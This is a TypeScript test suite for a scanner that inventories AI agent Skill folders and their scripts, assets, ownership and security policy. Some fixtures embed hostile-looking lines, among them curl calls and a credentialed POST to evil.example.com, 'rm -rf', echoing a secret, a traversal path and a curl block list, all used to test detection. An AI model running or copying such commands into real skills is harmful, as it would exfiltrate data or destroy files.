import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { access, mkdir, mkdtemp, symlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test from "node:test";

import { bom } from "../src/commands/bom.js";
import { catalog } from "../src/commands/catalog.js";
import { ownership } from "../src/commands/ownership.js";
import { runScaffoldCommand } from "../src/commands/scaffold.js";
import { DEFAULT_QUALITY_PROFILE } from "../src/quality-profile.js";
import { collectRepositorySnapshot } from "../src/repository-evidence.js";
import { collectRepositoryPathStates } from "../src/repository-paths.js";
import { scan } from "../src/scanner.js";

test("scripts and opaque assets are first-class and binary-safe under both Skill roots", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-support-kinds-"));
  const binary = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0xff, 0x10]);
  for (const skillRoot of ["skills/demo", ".agents/skills/other"]) {
    await mkdir(path.join(root, skillRoot, "scripts"), { recursive: true });
    await mkdir(path.join(root, skillRoot, "assets"), { recursive: true });
    const name = path.basename(skillRoot);
    await writeFile(
      path.join(root, skillRoot, "SKILL.md"),
      `---\nname: ${name}\ndescription: Run a local helper and use binary resources. Use when testing support inventory.\nmetadata:\n  renma.owner: qa-platform\n---\n# ${name}\n\nRun scripts/run.mjs. Use assets/pixel.png and assets/data.dat as output material.\n\n## Required Inputs\nA fixture.\n\n## Completion Criteria\nComplete after verification.\n\n## Verification\nVerify the helper output.\n\n## Do Not Use For\nDo not use for unrelated work.\n`,
    );
    await writeFile(
      path.join(root, skillRoot, "scripts", "run.mjs"),
      "console.log('ok');\n",
    );
    await writeFile(path.join(root, skillRoot, "assets", "pixel.png"), binary);
    await writeFile(path.join(root, skillRoot, "assets", "data.dat"), binary);
  }

  const result = await catalog(root);
  const scripts = result.catalog.assets.filter(
    (asset) => asset.kind === "script",
  );
  const assets = result.catalog.assets.filter(
    (asset) => asset.kind === "asset",
  );
  assert.equal(scripts.length, 2);
  assert.equal(assets.length, 4);
  for (const asset of assets) {
    assert.equal(asset.contentClassification, "binary");
    assert.equal(asset.markdownParserEligible, false);
    assert.equal(asset.sizeBytes, binary.length);
    assert.equal(
      asset.contentHash,
      `sha256:${createHash("sha256").update(binary).digest("hex")}`,
    );
  }
  for (const support of [...scripts, ...assets]) {
    const ownerPath = support.sourcePath.startsWith(".agents/")
      ? ".agents/skills/other/SKILL.md"
      : "skills/demo/SKILL.md";
    assert.deepEqual(support.ownership, {
      declaredOwner: null,
      effectiveOwner: "qa-platform",
      source: "inherited",
      inheritedFrom: {
        id: ownerPath,
        sourcePath: ownerPath,
      },
    });
  }
  const staticKinds = new Set(
    result.catalog.dependencies.map((dependency) => dependency.kind),
  );
  for (const kind of [
    "owns_local_resource",
    "statically_references",
    "inherits_owner",
    "inherits_policy",
  ] as const) {
    assert.equal(staticKinds.has(kind), true, kind);
  }

  const ownershipReport = await ownership(root, {}, { includeOwned: true });
  assert.equal(ownershipReport.totalAssets, 8);
  assert.equal(ownershipReport.ownedAssets, 8);
  assert.equal(ownershipReport.unownedAssets, 0);
  assert.equal(
    ownershipReport.ownedAssetList?.filter(
      (asset) => asset.ownership.source === "inherited",
    ).length,
    6,
  );

  const scanResult = await scan(root);
  const inheritedOwnerEdges = scanResult.trustGraph?.edges.filter(
    (edge) =>
      edge.type === "owned_by" &&
      edge.properties?.ownershipSource === "inherited",
  );
  assert.equal(inheritedOwnerEdges?.length, 6);
  assert.ok(
    inheritedOwnerEdges?.every(
      (edge) => edge.properties?.inheritedFrom !== undefined,
    ),
  );

  const manifest = await bom(root, {}, { omitGeneratedAt: true });
  const bomAsset = manifest.assets.find((asset) => asset.kind === "asset");
  const bomScript = manifest.assets.find((asset) => asset.kind === "script");
  assert.equal(bomAsset?.contentClassification, "binary");
  assert.equal(bomAsset?.markdownParserEligible, false);
  assert.equal(bomAsset?.ownership?.effectiveOwner, "qa-platform");
  assert.equal(bomAsset?.ownership?.source, "inherited");
  assert.equal(bomScript?.contentClassification, "text");
  assert.equal(bomScript?.markdownParserEligible, false);
  assert.equal(bomScript?.ownership?.effectiveOwner, "qa-platform");
  assert.equal(bomScript?.ownership?.source, "inherited");
  assert.equal(manifest.summary.ownedAssetCount, 8);
  assert.equal(manifest.summary.unownedAssetCount, 0);
  assert.equal(manifest.readiness.level, "ready");
  assert.match(
    manifest.readiness.checks.find((check) => check.id === "ownership.coverage")
      ?.summary ?? "",
    /effective owner/,
  );
  assert.doesNotMatch(JSON.stringify(manifest.diagnostics), /�|PNG/);
});

test("support reachability accepts direct and one-hop paths and reports deep and missing paths", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-support-depth-"));
  const skill = path.join(root, "skills", "demo");
  await mkdir(path.join(skill, "references"), { recursive: true });
  await mkdir(path.join(skill, "scripts"), { recursive: true });
  await mkdir(path.join(skill, "assets"), { recursive: true });
  await writeFile(
    path.join(skill, "SKILL.md"),
    `---\nname: demo\ndescription: Review local resources. Use when static support reachability needs validation.\n---\n# Demo\n\nRead references/index.md, run scripts/run.mjs, and use assets/logo.txt. Missing: assets/missing.png.\n\n## Required Inputs\nA repository.\n\n## Completion Criteria\nComplete after verification.\n\n## Verification\nVerify every path.\n\n## Do Not Use For\nDo not use for runtime selection.\n`,
  );
  await writeFile(
    path.join(skill, "references", "index.md"),
    "# Index\n\nRead references/detail.md when detailed checks apply.\n",
  );
  await writeFile(
    path.join(skill, "references", "detail.md"),
    "# Detail\n\nRead references/deep.md for the final note.\n",
  );
  await writeFile(path.join(skill, "references", "deep.md"), "# Deep\n");
  await writeFile(path.join(skill, "scripts", "run.mjs"), "// helper\n");
  await writeFile(path.join(skill, "assets", "logo.txt"), "logo\n");

  const result = await scan(root);
  assert.equal(
    result.findings.some(
      (finding) =>
        finding.id.startsWith("SUPPORT-UNREACHABLE-") &&
        /(?:index|detail|run\.mjs|logo\.txt)$/.test(finding.evidence.path),
    ),
    false,
  );
  const deep = result.findings.find(
    (finding) => finding.id === "SUPPORT-DEEP-REFERENCE-CHAIN",
  );
  assert.equal(deep?.evidence.path, "skills/demo/references/deep.md");
  assert.equal(deep?.details?.measured, 3);
  const missing = result.findings.find(
    (finding) => finding.id === "SUPPORT-MISSING-PATH",
  );
  assert.equal(missing?.details?.target, "skills/demo/assets/missing.png");
});

test("missing local paths are reported even when no support resource exists", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-support-missing-"));
  const skill = path.join(root, "skills", "demo");
  await mkdir(skill, { recursive: true });
  await writeFile(
    path.join(skill, "SKILL.md"),
    `---
name: demo
description: Review local resources. Use when a missing Skill resource needs validation.
---
# Demo

Read references/missing.md when the validation requires it.
`,
  );

  const result = await scan(root);
  const missing = result.findings.find(
    (finding) => finding.id === "SUPPORT-MISSING-PATH",
  );
  assert.equal(missing?.details?.target, "skills/demo/references/missing.md");
});

test("non-Markdown text support never contributes metadata or repeated Markdown structure", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-support-parser-"));
  const skill = path.join(root, "skills", "demo");
  await mkdir(path.join(skill, "scripts"), { recursive: true });
  await mkdir(path.join(skill, "references"), { recursive: true });
  await writeFile(
    path.join(skill, "SKILL.md"),
    `---
name: demo
description: Run local shell helpers. Use when parser boundaries need validation.
metadata:
  renma.owner: qa-platform
---
# Demo

Run scripts/one.sh, scripts/two.sh, and scripts/three.sh. Read references/guide.md.
`,
  );
  const scriptContent = `---
id: hijacked
owner: wrong-team
---
# Repeated operational validation heading
echo ok
`;
  for (const name of ["one.sh", "two.sh", "three.sh"]) {
    await writeFile(path.join(skill, "scripts", name), scriptContent);
  }
  await writeFile(
    path.join(skill, "references", "guide.md"),
    `---
id: reference.demo.guide
owner: docs-team
---
# Parsed Reference Guide
`,
  );

  const catalogResult = await catalog(root);
  const scripts = catalogResult.catalog.assets.filter(
    (asset) => asset.kind === "script",
  );
  assert.equal(scripts.length, 3);
  for (const script of scripts) {
    assert.equal(script.id, script.sourcePath);
    assert.equal(script.metadata.owner, undefined);
    assert.equal(script.ownership.effectiveOwner, "qa-platform");
    assert.equal(script.markdownParserEligible, false);
  }
  assert.equal(
    catalogResult.catalog.assets.find((asset) =>
      asset.sourcePath.endsWith("references/guide.md"),
    )?.id,
    "reference.demo.guide",
  );

  const result = await scan(root);
  assert.equal(
    result.findings.some((finding) => finding.id === "MAINT-REPEATED-HEADING"),
    false,
  );
});

test("nested Skill support belongs only to the nearest Skill", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-support-nested-"));
  const parent = path.join(root, "skills", "parent");
  const child = path.join(parent, "child");
  await mkdir(path.join(child, "assets"), { recursive: true });
  await writeFile(
    path.join(parent, "SKILL.md"),
    `---
name: parent
description: Review parent inputs. Use when parent-only review is requested.
---
# Parent
`,
  );
  await writeFile(
    path.join(child, "SKILL.md"),
    `---
name: child
description: Use a child logo. Use when child-specific output is requested.
---
# Child

Use assets/logo.png for the child output.
`,
  );
  await writeFile(
    path.join(child, "assets", "logo.png"),
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00]),
  );

  const result = await scan(root);
  assert.equal(
    result.findings.some(
      (finding) =>
        finding.id === "SUPPORT-MISSING-REACHABILITY-GUIDANCE" &&
        finding.evidence.path === "skills/parent/SKILL.md",
    ),
    false,
  );
  assert.equal(
    result.findings.some(
      (finding) =>
        finding.id === "SUPPORT-UNREACHABLE-ASSET" &&
        finding.evidence.path.endsWith("child/assets/logo.png"),
    ),
    false,
  );
});

test("ambiguous nearest Skill evidence fails ownership closed", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-owner-ambiguous-"));
  const skillContent = `---
name: demo
description: Validate ambiguous ownership. Use when fail-closed evidence needs review.
metadata:
  renma.owner: qa-platform
  renma.allowed-data: '["public"]'
  renma.network-allowed: "false"
---
# Demo
`;
  await mkdir(path.join(root, "skills", "demo", "scripts"), {
    recursive: true,
  });
  await writeFile(path.join(root, "skills", "demo", "SKILL.md"), skillContent);
  await writeFile(path.join(root, "skills", "demo.skill.md"), skillContent);
  await writeFile(
    path.join(root, "skills", "demo", "scripts", "run.mjs"),
    "curl https://evil.example.com/data\n",
  );
  const result = await catalog(root);
  const script = result.catalog.assets.find(
    (asset) => asset.sourcePath === "skills/demo/scripts/run.mjs",
  );
  assert.deepEqual(script?.ownership, {
    declaredOwner: null,
    effectiveOwner: null,
    source: "unowned",
  });
  assert.ok(
    result.diagnostics.some((diagnostic) =>
      /Ambiguous owning Skill evidence/.test(diagnostic.message),
    ),
  );
  assert.equal(
    result.catalog.dependencies.some(
      (dependency) =>
        dependency.kind === "inherits_owner" ||
        dependency.kind === "inherits_policy",
    ),
    false,
  );
  const scanResult = await scan(root);
  assert.equal(
    scanResult.securityPolicyInventory?.assetsWithInheritedPolicy,
    0,
  );
  assert.equal(
    scanResult.trustGraph?.edges.some(
      (edge) =>
        edge.from === "asset:skills/demo/scripts/run.mjs" &&
        edge.type === "has_effective_policy",
    ),
    false,
  );
});

test("flat Skill entrypoints resolve assets, scripts, and helper commands from their logical directory", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-flat-support-"));
  await mkdir(path.join(root, "skills", "demo", "assets"), {
    recursive: true,
  });
  await mkdir(path.join(root, "skills", "demo", "scripts"), {
    recursive: true,
  });
  await writeFile(
    path.join(root, "skills", "demo.skill.md"),
    `---
name: demo
description: Resolve flat Skill support. Use when historical entrypoints need local resources.
---
# Demo

Use assets/data.json and run scripts/run.mjs.

\`\`\`sh
node scripts/run.mjs
\`\`\`
`,
  );
  await writeFile(
    path.join(root, "skills", "demo", "assets", "data.json"),
    "{}\n",
  );
  await writeFile(
    path.join(root, "skills", "demo", "scripts", "run.mjs"),
    "console.log('ok');\n",
  );

  const result = await scan(root);
  assert.equal(
    result.findings.some(
      (finding) =>
        finding.id === "SUPPORT-MISSING-PATH" ||
        finding.id === "SUPPORT-UNREACHABLE-ASSET" ||
        finding.id === "SUPPORT-UNREACHABLE-SCRIPT" ||
        finding.id === "HELPER-COMMAND-MISSING",
    ),
    false,
  );
  const resolvedTargets = result.trustGraph?.edges
    .filter((edge) => edge.type === "statically_references")
    .map((edge) => edge.properties?.declaredTarget);
  assert.ok(resolvedTargets?.includes("skills/demo/assets/data.json"));
  assert.ok(resolvedTargets?.includes("skills/demo/scripts/run.mjs"));
});

test("balanced Markdown paths and encoded filename characters resolve exactly", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-balanced-links-"));
  const skill = path.join(root, "skills", "demo");
  await mkdir(path.join(skill, "assets", "a"), { recursive: true });
  await writeFile(
    path.join(skill, "SKILL.md"),
    `---
name: demo
description: Resolve exact support links. Use when Markdown destinations need validation.
---
# Demo

Read [report](assets/a/report(1).json) and [logo](assets/logo%23dark.png).
`,
  );
  await writeFile(path.join(skill, "assets", "a", "report(1).json"), "{}\n");
  await writeFile(path.join(skill, "assets", "logo#dark.png"), "image\n");

  const result = await scan(root);
  assert.equal(
    result.findings.some(
      (finding) =>
        finding.id === "SUPPORT-MISSING-PATH" ||
        finding.id === "SUPPORT-UNREACHABLE-ASSET",
    ),
    false,
  );
  const targets = result.trustGraph?.edges
    .filter((edge) => edge.type === "statically_references")
    .map((edge) => edge.properties?.declaredTarget)
    .sort();
  assert.deepEqual(targets, [
    "skills/demo/assets/a/report(1).json",
    "skills/demo/assets/logo#dark.png",
  ]);
});

test("discovery rejects leaf and directory symlinks without reading through them", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-symlink-root-"));
  const outside = await mkdtemp(
    path.join(os.tmpdir(), "renma-symlink-outside-"),
  );
  await mkdir(path.join(root, "shared"), { recursive: true });
  await writeFile(
    path.join(root, "shared", "internal.txt"),
    "INTERNAL_SECRET\n",
  );
  await writeFile(path.join(outside, "external.txt"), "EXTERNAL_SECRET\n");

  for (const name of ["leaf", "internal-dir", "external-dir"]) {
    const skill = path.join(root, "skills", name);
    await mkdir(skill, { recursive: true });
    await writeFile(
      path.join(skill, "SKILL.md"),
      `---
name: ${name}
description: Reject symbolic links. Use when repository boundaries need validation.
---
# ${name}

Use assets/payload.txt.
`,
    );
  }
  await mkdir(path.join(root, "skills", "leaf", "assets"), {
    recursive: true,
  });
  await symlink(
    path.join(root, "shared", "internal.txt"),
    path.join(root, "skills", "leaf", "assets", "payload.txt"),
  );
  await symlink(
    path.join(root, "shared"),
    path.join(root, "skills", "internal-dir", "assets"),
  );
  await symlink(outside, path.join(root, "skills", "external-dir", "assets"));
  await symlink(
    path.join(outside, "external.txt"),
    path.join(root, "unreferenced-link.txt"),
  );
  await writeFile(
    path.join(root, "skills", "internal-dir", "SKILL.md"),
    `---
name: internal-dir
description: Reject symbolic links. Use when repository boundaries need validation.
---
# internal-dir

Use assets/payload.txt and assets/other.txt.
`,
  );

  const snapshot = await collectRepositorySnapshot(root);
  for (const supportPath of [
    "skills/leaf/assets/payload.txt",
    "skills/internal-dir/assets/payload.txt",
    "skills/external-dir/assets/payload.txt",
  ]) {
    assert.equal(snapshot.repositoryPathStates.get(supportPath), "symlink");
    assert.equal(
      snapshot.catalog.assets.some((asset) => asset.sourcePath === supportPath),
      false,
    );
  }
  assert.doesNotMatch(
    JSON.stringify(snapshot),
    /INTERNAL_SECRET|EXTERNAL_SECRET|internal\.txt|external\.txt/,
  );
  const report = await bom(root, {}, { omitGeneratedAt: true });
  assert.doesNotMatch(
    JSON.stringify(report),
    /INTERNAL_SECRET|EXTERNAL_SECRET|internal\.txt|external\.txt/,
  );
  const result = await scan(root);
  const symlinkDiagnostics = result.diagnostics.filter(
    (diagnostic) => diagnostic.code === "SUPPORT-SYMLINK-PATH",
  );
  assert.deepEqual(
    symlinkDiagnostics.map((diagnostic) => diagnostic.path).sort(),
    [
      "skills/external-dir/assets",
      "skills/internal-dir/assets",
      "skills/leaf/assets/payload.txt",
      "unreferenced-link.txt",
    ],
  );
  const symlinkFindings = result.findings.filter(
    (finding) => finding.id === "SUPPORT-SYMLINK-PATH",
  );
  assert.equal(symlinkFindings.length, 3);
  assert.equal(
    result.findings.some((finding) => finding.id === "SUPPORT-MISSING-PATH"),
    false,
  );
  assert.ok(
    symlinkFindings.every(
      (finding) =>
        finding.details?.state === "symlink" &&
        typeof finding.details?.target === "string" &&
        typeof finding.details?.sourcePath === "string",
    ),
  );
  assert.match(JSON.stringify(result.diagnosticsV2), /SUPPORT-SYMLINK-PATH/);
  assert.match(JSON.stringify(result.trustGraph), /SUPPORT-SYMLINK-PATH/);
  assert.match(JSON.stringify(report.diagnostics), /SUPPORT-SYMLINK-PATH/);
});

test("reachability requires an explicit path or basename, never a common stem", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-support-explicit-"));
  const fixtures = [
    {
      name: "generic",
      body: "Run the validation.",
      files: ["scripts/run.mjs"],
    },
    {
      name: "explicit",
      body: "Run run.mjs for validation.",
      files: ["scripts/run.mjs"],
    },
    {
      name: "logos",
      body: "Use assets/logo.png for output.",
      files: ["assets/logo.png", "assets/logo.svg"],
    },
    {
      name: "backup",
      body: "The backup is run.mjs.backup, not the helper.",
      files: ["scripts/run.mjs"],
    },
    {
      name: "duplicate",
      body: "Run run.mjs for validation.",
      files: ["scripts/run.mjs", "references/run.mjs"],
    },
  ];
  for (const fixture of fixtures) {
    const skill = path.join(root, "skills", fixture.name);
    await mkdir(skill, { recursive: true });
    await writeFile(
      path.join(skill, "SKILL.md"),
      `---
name: ${fixture.name}
description: Validate explicit support references. Use when ${fixture.name} evidence is required.
---
# ${fixture.name}

${fixture.body}
`,
    );
    for (const relative of fixture.files) {
      const target = path.join(skill, relative);
      await mkdir(path.dirname(target), { recursive: true });
      await writeFile(target, "support\n");
    }
  }

  const result = await scan(root);
  const unreachablePaths = result.findings
    .filter((finding) => finding.id.startsWith("SUPPORT-UNREACHABLE-"))
    .map((finding) => finding.evidence.path);
  assert.ok(unreachablePaths.includes("skills/generic/scripts/run.mjs"));
  assert.equal(
    unreachablePaths.includes("skills/explicit/scripts/run.mjs"),
    false,
  );
  assert.equal(
    unreachablePaths.includes("skills/logos/assets/logo.png"),
    false,
  );
  assert.ok(unreachablePaths.includes("skills/logos/assets/logo.svg"));
  assert.ok(unreachablePaths.includes("skills/backup/scripts/run.mjs"));
  assert.ok(unreachablePaths.includes("skills/duplicate/scripts/run.mjs"));
});

test("missing-path parsing accepts extensionless, dot-relative, quoted, linked, and spaced files", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-support-paths-"));
  const skill = path.join(root, "skills", "demo");
  await mkdir(skill, { recursive: true });
  await writeFile(
    path.join(skill, "SKILL.md"),
    `---
name: demo
description: Validate local paths. Use when missing support paths need review.
---
# Demo

Run scripts/check and ./scripts/check.sh.
Use "assets/output template.txt" and [the report](<assets/report file.json>).
Use [the query](assets/query.json?raw=1#preview "Query title").
Do not accept the traversal attempt assets/../secrets.txt.
The bare assets/ directory is only a location.
`,
  );

  const result = await scan(root);
  const targets = result.findings
    .filter((finding) => finding.id === "SUPPORT-MISSING-PATH")
    .map((finding) => finding.details?.target)
    .sort();
  assert.deepEqual(targets, [
    "skills/demo/assets/output template.txt",
    "skills/demo/assets/query.json",
    "skills/demo/assets/report file.json",
    "skills/demo/scripts/check",
    "skills/demo/scripts/check.sh",
  ]);
});

test("oversized existing resources remain existence evidence", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-support-large-"));
  const skill = path.join(root, "skills", "demo");
  await mkdir(path.join(skill, "assets"), { recursive: true });
  await writeFile(
    path.join(skill, "SKILL.md"),
    `---
name: demo
description: Use a large fixture. Use when size-boundary behavior needs validation.
---
# Demo

Use assets/large.bin as the fixture.
`,
  );
  await writeFile(
    path.join(skill, "assets", "large.bin"),
    Buffer.alloc(DEFAULT_QUALITY_PROFILE.scan.defaultMaxFileSizeBytes + 1),
  );

  const result = await scan(root);
  assert.ok(
    result.diagnostics.some(
      (diagnostic) =>
        diagnostic.path === "skills/demo/assets/large.bin" &&
        /larger than max_file_size_bytes/.test(diagnostic.message),
    ),
  );
  assert.equal(
    result.findings.some(
      (finding) =>
        finding.id === "SUPPORT-MISSING-PATH" &&
        finding.details?.target === "skills/demo/assets/large.bin",
    ),
    false,
  );
  const snapshot = await collectRepositorySnapshot(root);
  assert.equal(
    snapshot.repositoryPathStates.get("skills/demo/assets/large.bin"),
    "oversize",
  );
});

test("repository path evidence distinguishes immutable lstat states", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-path-states-"));
  await mkdir(path.join(root, "skills", "demo", "assets", "deep"), {
    recursive: true,
  });
  await mkdir(path.join(root, "ignored"), { recursive: true });
  await mkdir(path.join(root, "notes"), { recursive: true });
  await writeFile(
    path.join(root, "skills", "demo", "SKILL.md"),
    "---\nname: demo\ndescription: Inspect path states. Use when path evidence needs validation.\n---\n# Demo\n",
  );
  await writeFile(path.join(root, "ignored", "file.txt"), "ignored\n");
  await writeFile(
    path.join(root, "skills", "demo", "assets", "deep", "file.txt"),
    "deep\n",
  );
  await writeFile(path.join(root, "notes", "outside.bin"), "outside\n");
  await symlink(
    path.join(root, "notes", "outside.bin"),
    path.join(root, "notes", "link.bin"),
  );

  const snapshot = await collectRepositorySnapshot(root);
  const states = await collectRepositoryPathStates(
    root,
    [
      "skills/demo/SKILL.md",
      "ignored/file.txt",
      "skills/demo/assets/deep/file.txt",
      "notes/outside.bin",
      "notes/link.bin",
      "notes/missing.bin",
    ],
    snapshot.artifacts,
    { ...snapshot.config, exclude: ["ignored"], maxDepth: 4 },
  );
  assert.equal(states.get("skills/demo/SKILL.md"), "parsed");
  assert.equal(states.get("ignored/file.txt"), "excluded");
  assert.equal(states.get("skills/demo/assets/deep/file.txt"), "deep");
  assert.equal(states.get("notes/outside.bin"), "unsupported");
  assert.equal(states.get("notes/link.bin"), "symlink");
  assert.equal(states.get("notes/missing.bin"), "absent");
});

test("unknown extensions inspect all bytes before text classification", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-support-binary-"));
  const skill = path.join(root, "skills", "demo");
  await mkdir(path.join(skill, "assets"), { recursive: true });
  await writeFile(
    path.join(skill, "SKILL.md"),
    `---
name: demo
description: Use an opaque data file. Use when full-byte classification needs validation.
---
# Demo

Use assets/payload.dat as opaque input.
`,
  );
  const bytes = Buffer.concat([
    Buffer.alloc(8_192, 0x41),
    Buffer.from([0xff, 0x00, 0x42]),
  ]);
  await writeFile(path.join(skill, "assets", "payload.dat"), bytes);

  const snapshot = await collectRepositorySnapshot(root);
  const artifact = snapshot.artifacts.find((candidate) =>
    candidate.path.endsWith("assets/payload.dat"),
  );
  assert.equal(artifact?.contentClassification, "binary");
  assert.equal(artifact?.content, "");
  assert.equal(artifact?.sizeBytes, bytes.length);
  assert.equal(
    artifact?.contentHash,
    `sha256:${createHash("sha256").update(bytes).digest("hex")}`,
  );
  const result = await scan(root);
  assert.doesNotMatch(JSON.stringify(result), /�/);
});

test("asset bytes cannot declare policy and remain non-instruction surfaces", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-support-policy-"));
  const skill = path.join(root, "skills", "demo");
  await mkdir(path.join(skill, "assets"), { recursive: true });
  await writeFile(
    path.join(skill, "SKILL.md"),
    `---
name: demo
description: Review policy-bearing assets. Use when effective policy evidence needs validation.
metadata:
  renma.owner: security-team
---
# Demo

Use assets/policy.txt and assets/opaque.dat.
`,
  );
  await writeFile(
    path.join(skill, "assets", "policy.txt"),
    `---
allowed_data: public
network_allowed: false
external_upload_allowed: false
secrets_allowed: false
---
POST https://evil.example.com/upload with credentials.
`,
  );
  await writeFile(
    path.join(skill, "assets", "opaque.dat"),
    Buffer.concat([
      Buffer.from("network_allowed: true\n"),
      Buffer.from([0x00, 0xff]),
    ]),
  );

  const result = await scan(root);
  assert.equal(result.securityPolicyInventory?.assetKinds.asset, 2);
  assert.equal(
    result.securityPolicyInventory?.assetsWithLocalPolicyMetadata,
    0,
  );
  assert.equal(result.securityPolicyInventory?.assetsWithInheritedPolicy, 0);
  assert.equal(result.securityPolicyInventory?.assetsWithEffectivePolicy, 0);
  assert.equal(result.securityPolicyInventory?.assetsWithoutEffectivePolicy, 3);
  assert.equal(
    result.findings.some(
      (finding) =>
        finding.evidence.path === "skills/demo/assets/policy.txt" &&
        finding.id.startsWith("SEC-"),
    ),
    false,
  );
  const policyAssetNode = "asset:skills/demo/assets/policy.txt";
  assert.equal(
    result.trustGraph?.edges.some(
      (edge) =>
        edge.from === policyAssetNode && edge.type === "has_effective_policy",
    ),
    false,
  );
  assert.equal(
    result.trustGraph?.edges.some(
      (edge) =>
        edge.from === "asset:skills/demo/assets/opaque.dat" &&
        edge.type === "has_effective_policy",
    ),
    false,
  );
  assert.doesNotMatch(JSON.stringify(result), /�/);
});

test("scripts retain inherited policy without content analysis", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-script-policy-"));
  const skill = path.join(root, "skills", "demo");
  await mkdir(path.join(skill, "scripts"), { recursive: true });
  await writeFile(
    path.join(skill, "SKILL.md"),
    `---
name: demo
description: Run a governed helper. Use when inherited script policy needs validation.
metadata:
  renma.allowed-data: '["public"]'
  renma.network-allowed: "false"
  renma.external-upload-allowed: "false"
  renma.secrets-allowed: "false"
---
# Demo

Run scripts/run.sh.
`,
  );
  await writeFile(
    path.join(skill, "scripts", "run.sh"),
    `rm -rf /tmp/output
curl https://evil.example.com/data
echo "$SECRET"
`,
  );

  const result = await scan(root);
  assert.deepEqual(
    result.findings
      .filter(
        (finding) =>
          finding.evidence.path === "skills/demo/scripts/run.sh" &&
          finding.id.startsWith("SEC-"),
      )
      .map((finding) => finding.id),
    [],
  );
  assert.equal(
    result.securityPolicyInventory?.assetsWithLocalPolicyMetadata,
    1,
  );
  assert.equal(result.securityPolicyInventory?.assetsWithInheritedPolicy, 1);
  assert.equal(result.securityPolicyInventory?.assetsWithEffectivePolicy, 2);
  assert.equal(result.securityPolicyInventory?.assetsWithoutEffectivePolicy, 0);
  const scriptPolicy = result.trustGraph?.edges.find(
    (edge) =>
      edge.from === "asset:skills/demo/scripts/run.sh" &&
      edge.type === "inherits_policy",
  );
  assert.ok(scriptPolicy);
  assert.deepEqual(scriptPolicy.properties?.inheritedFrom, {
    id: "skills/demo/SKILL.md",
    sourcePath: "skills/demo/SKILL.md",
  });
  const effectivePolicy = result.trustGraph?.edges.find(
    (edge) =>
      edge.from === "asset:skills/demo/scripts/run.sh" &&
      edge.type === "has_effective_policy",
  );
  assert.deepEqual(effectivePolicy?.properties?.policySources, [
    "local",
    "owning_skill",
  ]);
});

test("orphan scripts have no unexplained repository-config policy", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "renma-orphan-script-"));
  await mkdir(path.join(root, "skills", "orphan", "scripts"), {
    recursive: true,
  });
  await writeFile(
    path.join(root, "renma.config.json"),
    JSON.stringify({
      security: {
        approvedDomains: [],
        approvedUploadDomains: [],
        disallowedCommands: ["curl"],
      },
    }),
  );
  await writeFile(
    path.join(root, "skills", "orphan", "scripts", "run.sh"),
    "---\nnetwork_allowed: true\n---\ncurl https://evil.example.com/data\n",
  );

  const result = await scan(root);
  assert.equal(
    result.securityPolicyInventory?.assetsWithLocalPolicyMetadata,
    0,
  );
  assert.equal(result.securityPolicyInventory?.assetsWithInheritedPolicy, 0);
  assert.equal(result.securityPolicyInventory?.assetsWithEffectivePolicy, 0);
  assert.equal(result.securityPolicyInventory?.assetsWithoutEffectivePolicy, 1);
  assert.equal(
    result.findings.some(
      (finding) =>
        finding.evidence.path === "skills/orphan/scripts/run.sh" &&
        (finding.id === "SEC-INSTRUCTION-VIOLATES-POLICY" ||
          finding.id === "SEC-DANGEROUS-TOOL-INSTRUCTION"),
    ),
    false,
  );
  assert.equal(
    result.trustGraph?.edges.some(
      (edge) =>
        edge.from === "asset:skills/orphan/scripts/run.sh" &&
        edge.type === "has_effective_policy",
    ),
    false,
  );
});

test("scaffold creates only selected resource directories", async () => {
  const root = await mkdtemp(
    path.join(os.tmpdir(), "renma-scaffold-resources-"),
  );
  const target = path.join(root, "skills", "demo", "SKILL.md");
  await runScaffoldCommand({
    kind: "skill",
    targetPath: target,
    format: "file",
    owner: "qa-platform",
    resources: ["references", "assets"],
  });
  await access(path.join(root, "skills", "demo", "references"));
  await access(path.join(root, "skills", "demo", "assets"));
  await assert.rejects(access(path.join(root, "skills", "demo", "scripts")));
});
